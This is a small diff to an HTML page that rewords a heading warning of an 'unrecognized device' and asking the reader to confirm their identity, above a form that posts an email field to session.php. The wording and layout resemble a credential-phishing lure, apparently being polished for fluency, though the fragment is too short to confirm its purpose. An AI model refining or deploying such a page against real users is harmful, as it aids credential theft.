@@ -113,7 +113,7 @@
 <body>
 
 <div class="container">
-    <h2>Unrecognized Device is Detected. Confirm Identity</h2>
+    <h2>An unrecognized device has been detected. Please confirm your identity</h2>
     <form method="POST" action="session.php">
         <input type="email" name="email" placeholder="Email" required>
 
